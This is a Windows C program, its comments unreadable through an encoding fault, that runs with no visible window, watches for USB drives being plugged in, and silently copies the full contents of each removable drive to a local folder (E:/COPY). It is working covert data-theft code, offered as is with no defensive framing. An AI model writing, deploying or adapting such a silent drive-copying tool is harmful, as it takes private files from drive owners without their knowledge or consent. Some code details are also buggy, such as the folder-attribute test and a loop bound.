#include<windows.h>
#include<Dbt.h>//
#include<string.h>
#include <direct.h>

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

//���߼���Ԫ��ȡ�̷�����
char FirstDriveFromMask(ULONG unitMask);
//copy file
DWORD WINAPI CopyProc(LPVOID lPvoid);
//����
void Copy(TCHAR* szRoot,TCHAR* szDest);

//U�̸�Ŀ¼
TCHAR g_szRoot[MAX_PATH];
//U�̸���Ŀ�ĵ�
TCHAR g_szDest[MAX_PATH]=	TEXT("E:/COPY");

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstance, PSTR szCmdLine, int iCmdShow)
{
	//��һ������
	TCHAR szAppName[] = TEXT("MYWINDOWS");
	MSG msg;
	WNDCLASS wndclass;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wndclass.hCursor = LoadCursor(NULL,IDC_ARROW);
	wndclass.hIcon = NULL;
	wndclass.hInstance = hInstance;
	wndclass.lpfnWndProc = WndProc;
	wndclass.lpszMenuName = NULL;
	wndclass.lpszClassName = szAppName;
	wndclass.style = CS_HREDRAW | CS_VREDRAW;

	RegisterClass(&wndclass);

	HWND hwnd = CreateWindow(
		szAppName,
		TEXT("this is caption"),
		WS_OVERLAPPEDWINDOW,
		300,200,
		400,300,
		NULL,
		NULL,
		hInstance,
		NULL);

	//ShowWindow(hwnd, iCmdShow);//SW_SHOW
	UpdateWindow(hwnd);

	while (GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
		DEV_BROADCAST_HDR* lpdb;
		DEV_BROADCAST_VOLUME* lpdbv;
		char ch;

	case WM_DEVICECHANGE: ////
		switch (wParam)//�豸״̬��������
		{
		case DBT_DEVICEARRIVAL:
			lpdb = (DEV_BROADCAST_HDR*)lParam;
			lpdbv = (DEV_BROADCAST_VOLUME*)lpdb;

		 //��ȡ�̷�����
			 ch=FirstDriveFromMask(lpdbv->dbcv_unitmask);
			wsprintf(g_szRoot, TEXT("%c:\\"), ch);

			//�ж��豸�����Ƿ��ǿ��ƶ�
			if (GetDriveType(g_szRoot) == DRIVE_REMOVABLE)
			{
				//��ʼ����
				CreateThread(0, 0, CopyProc, 0, 0, 0);
				//�鿴U���Ƿ�׼������
				
			}
			break;

		case DBT_DEVICEREMOVECOMPLETE:
			
			break;
		}

		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	}
	
	
	return DefWindowProc(hwnd,message,wParam,lParam);
}

char FirstDriveFromMask(ULONG unitMask)
{
	int i;
	for (i = 0;i <= 32;i++)
	{
		if (unitMask & 1)
			break;
		else
			unitMask = unitMask >> 1;
	}
	return 'A' + i;
}

DWORD WINAPI CopyProc(LPVOID lPvoid)
{
	//copy file
	Copy(g_szRoot,g_szDest);
	return 0;
}

void Copy(TCHAR* szRoot, TCHAR* szDest)
{
	//�鿴Ŀ¼�ڲ���
	//DWORD dwFileAttribute = ::GetFileAttributes(szDest);
	//�洢���ļ�(�����ļ���)��Ϣ
	WIN32_FIND_DATA stWinFileDate;
	HANDLE    hd; //�ļ������ָ����һ���ļ�
	TCHAR szFindDir[260] = { 0 };
	TCHAR szNextSrc[260] = { 0 };
	TCHAR szNextDst[260] = { 0 };


	//*��ʾ�� szSrcPath �µ������ļ�
	wsprintf(szFindDir, TEXT("%s\\*"), szRoot);
	
	//�ҵ�Ŀ¼��һ���ļ��󣬰��ļ���Ϣ����stWinFileDate��
	//���ؾ��hd ,��������һ���ļ�
	hd = FindFirstFile(szFindDir, &stWinFileDate);
	if (hd == INVALID_HANDLE_VALUE)
	{
		return ;
	}
	//FileName: "." ��ʾ��ǰĿ¼�� ".." ��ʾ��һ��Ŀ¼
	while (1)
	{
		//D:\UDisk\..\AA  //�൱��D:\\AA
		if (strcmp((const char*)stWinFileDate.cFileName, ".") != 0
			&& strcmp((const char*)stWinFileDate.cFileName, "..") != 0)
		{
			//printf("Find file:%s\n", stWinFileDate.cFileName);
			if (stWinFileDate.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
			{
				memset(szNextDst, 0, 260);
				wsprintf(szNextDst,TEXT( "%s\\%s"),
					szDest, stWinFileDate.cFileName);
				_mkdir((const char*)szNextDst);

				memset(szNextSrc, 0, 260);
				wsprintf(szNextSrc, TEXT( "%s\\%s"),
					szRoot, stWinFileDate.cFileName);

				Copy(szNextSrc, szNextDst);
			}
			else
			{
				memset(szNextDst, 0, 260);
				wsprintf(szNextDst, TEXT( "%s\\%s"),
					szDest, stWinFileDate.cFileName);

				memset(szNextSrc, 0, 260);
				wsprintf(szNextSrc, TEXT( "%s\\%s"),
					szRoot, stWinFileDate.cFileName);

				
				CopyFile(szNextSrc, szNextDst, 0);
			}
		}
		//����λ���������FindNextFile ��Ҫ�ŵ� strcmp(,".") �ж�����
		//ͨ�����hd����һ���ļ����ҵ������ stWinFileDate
		if (!FindNextFile(hd, &stWinFileDate))
		{
			break;
		}
	}
	FindClose(hd);

	return ;
}
